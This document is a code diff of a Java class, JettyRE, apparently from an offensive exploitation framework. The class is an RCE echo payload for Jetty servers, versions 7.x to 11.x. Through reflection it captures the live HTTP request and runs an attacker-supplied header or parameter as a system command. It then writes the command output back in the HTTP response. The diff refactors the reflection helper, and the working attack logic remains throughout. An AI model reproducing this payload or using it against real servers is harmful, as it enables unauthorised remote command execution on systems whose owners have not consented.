@@ -1,6 +1,7 @@
 package com.ppp.middleware.rceecho;
 
 import com.ppp.annotation.JavaClassModifiable;
+import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.Middleware;
 
 import java.io.InputStream;
@@ -22,6 +23,7 @@ import java.lang.reflect.Method;
  * 7.x、8.x、9.x、10.x、11.x
  */
 @Middleware(Middleware.Jetty)
+@JavaClassType(JavaClassType.Default)
 @JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
 public class JettyRE {
     private static String HEADER;
@@ -57,26 +59,24 @@ public class JettyRE {
                 if (response == null)
                     continue;
 
-                Object header = request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, HEADER);
-                Object param = request.getClass().getDeclaredMethod("getParameter", String.class).invoke(request, PARAM);
-
-                String result = null;
+                Object header = invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+                Object param = invokeMethod(request.getClass(), request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
+                String str = null;
                 if (header != null) {
-                    result = exec((String) header);
+                    str = (String) header;
                 } else if (param != null) {
-                    result = exec((String) param);
+                    str = (String) param;
                 }
-
-                Object writer = response.getClass().getDeclaredMethod("getWriter").invoke(response);
-
+                String result = exec(str);
+                invokeMethod(response.getClass(), response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+                Object writer = invokeMethod(response.getClass(), response, "getWriter", new Class[]{}, new Object[]{});
                 try {
-                    invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
-                } catch (Exception e) {
-                    invokeMethod(value, "getPrintWriter", new Class[]{String.class}, new Object[]{result});
+                    invokeMethod(writer.getClass(), writer, "println", new Class[]{String.class}, new Object[]{result});
+                }catch (Exception e){
+                    invokeMethod(writer.getClass(), writer, "getPrintWriter", new Class[]{String.class}, new Object[]{result});
                 }
 
                 return;
-
             }
         } catch (Exception e) {
 
@@ -121,15 +121,11 @@ public class JettyRE {
         return stringBuilder.toString();
     }
 
-    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
-        Method method;
-        try {
-            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
-        } catch (NoSuchMethodException e) {
-            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
-        }
+    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
-        return method.invoke(obj, args);
+        Object object = method.invoke(obj, args);
+        return object;
     }
 
 }
